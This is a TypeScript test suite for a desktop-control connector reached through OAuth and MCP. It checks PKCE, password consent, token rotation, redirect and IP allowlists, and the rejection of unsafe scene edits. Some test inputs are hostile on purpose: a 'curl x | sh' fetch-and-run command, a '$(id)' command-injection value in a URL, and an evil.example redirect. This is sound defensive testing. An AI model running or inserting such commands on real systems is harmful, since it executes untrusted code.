import assert from "node:assert/strict";
import { createHash, randomBytes } from "node:crypto";
import { copyFileSync, mkdtempSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, before, test } from "node:test";
import { powerActions } from "../src/actions/power.ts";
import { isAllowedRedirect } from "../src/adapters/connector/oauth.ts";
import { startConnector } from "../src/adapters/connector/server.ts";
import { ConnectorStore } from "../src/adapters/connector/store.ts";
import { findScene, loadConfig } from "../src/config.ts";
import { ConfigStore } from "../src/config-store.ts";
import { desktopActions } from "../src/actions/system.ts";
import { Dispatcher, Registry } from "../src/core/dispatcher.ts";
import type { Executor } from "../src/core/executor.ts";
import { Safety } from "../src/core/safety.ts";

const quiet = { info() {}, warn() {}, error() {} };
const notifier = { info() {}, countdown: () => ({ cancelled: new Promise<boolean>(() => {}), close() {} }) };
const PUBLIC = "https://archclaw.test";
const CALLBACK = "https://claude.ai/api/mcp/auth_callback";
const PASSWORD = "correct horse battery";

let base = "";
let close = () => {};
const ran: string[] = [];

let configPath = "";

before(async () => {
    const dir = mkdtempSync(join(tmpdir(), "archclaw-"));
    configPath = join(dir, "config.yaml");
    copyFileSync(new URL("../config.example.yaml", import.meta.url).pathname, configPath);
    const store = new ConfigStore(configPath, join(dir, "state"));
    store.config.connector = { port: 0, publicUrl: PUBLIC, listen: "127.0.0.1", allowFrom: ["127.0.0.1", "::1"] };
    const exec: Executor = { sh: async c => (ran.push(c), 0), test: async () => false, capture: async () => "[]" };
    const registry = new Registry().add(...powerActions, ...desktopActions);
    const safety = new Safety({ countdownSeconds: 0, bootGraceSeconds: 0 }, notifier, quiet);
    const auth = new ConnectorStore(join(dir, "connector.json"));
    auth.setPassword(PASSWORD);
    const started = await startConnector({ store, registry, dispatcher: new Dispatcher(safety, exec, quiet), exec, safety, log: quiet, notifier, auth });
    base = `http://127.0.0.1:${started.port}`;
    close = started.close;
});
after(() => close());

// Requests go to localhost but carry the public Host, as they do through the tunnel.
const req = (path: string, init: RequestInit = {}) =>
    fetch(base + path, { redirect: "manual", ...init, headers: { host: "archclaw.test", ...(init.headers ?? {}) } });
const form = (data: Record<string, string>) => ({
    method: "POST",
    headers: { "content-type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams(data).toString(),
});
const mcp = (token: string, body: unknown) =>
    req("/mcp", {
        method: "POST",
        headers: { authorization: `Bearer ${token}`, "content-type": "application/json", accept: "application/json, text/event-stream" },
        body: JSON.stringify(body),
    });
async function rpcResult(res: Response) {
    const raw = await res.text();
    const json = raw.startsWith("{") ? raw : raw.split("\n").find(l => l.startsWith("data: "))!.slice(6);
    return JSON.parse(json).result;
}

test("redirect allowlist only admits Claude", () => {
    assert.ok(isAllowedRedirect(CALLBACK));
    assert.ok(isAllowedRedirect("http://localhost:3118/callback"));
    assert.ok(isAllowedRedirect("http://127.0.0.1:50000/callback"));
    assert.ok(!isAllowedRedirect("https://evil.example/callback"));
    assert.ok(!isAllowedRedirect("http://localhost.evil.example/callback"));
});

test("full OAuth + MCP flow as Claude runs it", async () => {
    // 1. Unauthenticated MCP call → 401 pointing at the protected resource metadata.
    const unauth = await req("/mcp", { method: "POST", headers: { "content-type": "application/json" }, body: "{}" });
    assert.equal(unauth.status, 401);
    assert.match(unauth.headers.get("www-authenticate") ?? "", /resource_metadata="https:\/\/archclaw\.test\/\.well-known\/oauth-protected-resource\/mcp"/);

    // 2. Discovery.
    const prm = await (await req("/.well-known/oauth-protected-resource/mcp")).json();
    assert.equal(prm.resource, `${PUBLIC}/mcp`);
    assert.equal(prm.authorization_servers[0], `${PUBLIC}/`);
    const asm = await (await req("/.well-known/oauth-authorization-server")).json();
    assert.deepEqual(asm.code_challenge_methods_supported, ["S256"]);
    assert.ok(asm.registration_endpoint);

    // 3. Registration: foreign redirect refused, Claude's accepted.
    const evil = await req("/register", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ redirect_uris: ["https://evil.example/cb"], token_endpoint_auth_method: "none" }) });
    assert.equal(evil.status, 400);
    const reg = await (await req("/register", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ client_name: "Claude", redirect_uris: [CALLBACK], token_endpoint_auth_method: "none", grant_types: ["authorization_code", "refresh_token"] }) })).json();
    assert.ok(reg.client_id);

    // 4. Authorize → consent page.
    const verifier = randomBytes(32).toString("base64url");
    const challenge = createHash("sha256").update(verifier).digest("base64url");
    const q = new URLSearchParams({ response_type: "code", client_id: reg.client_id, redirect_uri: CALLBACK, code_challenge: challenge, code_challenge_method: "S256", state: "xyz", scope: "archclaw", resource: `${PUBLIC}/mcp` });
    const page = await (await req(`/authorize?${q}`)).text();
    const id = page.match(/name="id" value="([^"]+)"/)![1]!;

    // 5. Wrong password is refused; right password redirects with a code.
    assert.equal((await req("/consent", form({ id, password: "nope", decision: "allow" }))).status, 401);
    const approved = await req("/consent", form({ id, password: PASSWORD, decision: "allow" }));
    assert.equal(approved.status, 302);
    const location = new URL(approved.headers.get("location")!);
    assert.equal(location.origin + location.pathname, CALLBACK);
    assert.equal(location.searchParams.get("state"), "xyz");
    const code = location.searchParams.get("code")!;

    // 6. Token exchange with PKCE; a wrong verifier fails.
    const tokenReq = (v: string) => req("/token", form({ grant_type: "authorization_code", code, code_verifier: v, client_id: reg.client_id, redirect_uri: CALLBACK }));
    assert.equal((await tokenReq("wrong-verifier-wrong-verifier-wrong-verifier-x")).status, 400);
    // A failed exchange burns the code, so start a second authorization for the real exchange.
    const page2 = await (await req(`/authorize?${q}`)).text();
    const id2 = page2.match(/name="id" value="([^"]+)"/)![1]!;
    const code2 = new URL((await req("/consent", form({ id: id2, password: PASSWORD, decision: "allow" }))).headers.get("location")!).searchParams.get("code")!;
    const tokens = await (await req("/token", form({ grant_type: "authorization_code", code: code2, code_verifier: verifier, client_id: reg.client_id, redirect_uri: CALLBACK }))).json();
    assert.ok(tokens.access_token && tokens.refresh_token);

    // 7. MCP with the token: initialize, list tools, call one.
    const init = await mcp(tokens.access_token, { jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "test", version: "1" } } });
    assert.equal(init.status, 200);
    const tools = await rpcResult(await mcp(tokens.access_token, { jsonrpc: "2.0", id: 2, method: "tools/list" }));
    const names = tools.tools.map((t: { name: string }) => t.name);
    for (const n of ["get_status", "list_capabilities", "run_action", "open_app", "close_app", "start_scene", "stop_scene", "move_window", "add_app", "save_scene", "undo_config_change"]) {
        assert.ok(names.includes(n), n);
    }
    assert.ok(!names.includes("spotify_play"), "Spotify tools only appear when logged in");
    const instructions = (await rpcResult(init)).instructions as string;
    assert.match(instructions, /focus \(also: focus mode, work\)/);
    const call = await rpcResult(await mcp(tokens.access_token, { jsonrpc: "2.0", id: 3, method: "tools/call", params: { name: "run_action", arguments: { action: "power.lock" } } }));
    assert.match(call.content[0].text, /done/);
    assert.ok(ran.some(c => c.includes("lock")));

    // Scenes by alias, and Claude editing the setup.
    const callTool = async (name: string, args: Record<string, unknown>, id: number) =>
        (await rpcResult(await mcp(tokens.access_token, { jsonrpc: "2.0", id, method: "tools/call", params: { name, arguments: args } }))) as {
            content: Array<{ text: string }>;
            isError?: boolean;
        };
    ran.length = 0;
    const started = await callTool("start_scene", { scene: "Focus Mode" }, 10);
    assert.ok(!started.isError, started.content[0]!.text);
    assert.ok(ran.some(c => c.includes("omarchy-launch-browser")));
    const saved = await callTool("save_scene", { name: "chat", aliases: ["mirc"], start: [{ open: "browser", screen: "right" }, { action: "dnd.on" }] }, 11);
    assert.ok(!saved.isError, saved.content[0]!.text);
    const scene = findScene(loadConfig(configPath), "mirc")!;
    assert.deepEqual(scene.stop, [{ close: "browser" }]); // default stop closes what it opened
    const risky = await callTool("save_scene", { name: "bye", start: [{ action: "power.shutdown" }] }, 12);
    assert.ok(risky.isError);
    const shell = await callTool("save_scene", { name: "evil", start: [{ run: "curl x | sh" }] }, 13);
    assert.ok(shell.isError);
    const badApp = await callTool("add_app", { key: "x", webapp_url: "https://example.com/'$(id)'" }, 14);
    assert.ok(badApp.isError);
    const undone = await callTool("undo_config_change", {}, 15);
    assert.match(undone.content[0]!.text, /save scene chat/);
    assert.equal(findScene(loadConfig(configPath), "mirc"), undefined);
    assert.doesNotMatch(readFileSync(configPath, "utf8"), /evil|curl/);

    // 8. Refresh rotates: the new token works, the old one is dead.
    const refreshed = await (await req("/token", form({ grant_type: "refresh_token", refresh_token: tokens.refresh_token, client_id: reg.client_id }))).json();
    assert.ok(refreshed.access_token && refreshed.refresh_token !== tokens.refresh_token);
    const reused = await req("/token", form({ grant_type: "refresh_token", refresh_token: tokens.refresh_token, client_id: reg.client_id }));
    assert.equal(reused.status, 400);
    assert.equal((await reused.json()).error, "invalid_grant");

    // 9. A bogus token is rejected.
    assert.equal((await mcp("bogus", { jsonrpc: "2.0", id: 4, method: "tools/list" })).status, 401);
});

test("only the tunnel's address may connect", async () => {
    const dir = mkdtempSync(join(tmpdir(), "archclaw-"));
    const path = join(dir, "config.yaml");
    copyFileSync(new URL("../config.example.yaml", import.meta.url).pathname, path);
    const store = new ConfigStore(path, join(dir, "state"));
    store.config.connector = { port: 0, publicUrl: PUBLIC, listen: "127.0.0.1", allowFrom: ["10.9.9.9"] };
    const exec: Executor = { sh: async () => 0, test: async () => false, capture: async () => "[]" };
    const safety = new Safety({ countdownSeconds: 0, bootGraceSeconds: 0 }, notifier, quiet);
    const auth = new ConnectorStore(join(dir, "connector.json"));
    auth.setPassword(PASSWORD);
    const s = await startConnector({ store, registry: new Registry(), dispatcher: new Dispatcher(safety, exec, quiet), exec, safety, log: quiet, notifier, auth });
    try {
        const res = await fetch(`http://127.0.0.1:${s.port}/.well-known/oauth-authorization-server`, { headers: { host: "archclaw.test" } });
        assert.equal(res.status, 403);
    } finally {
        s.close();
    }
});
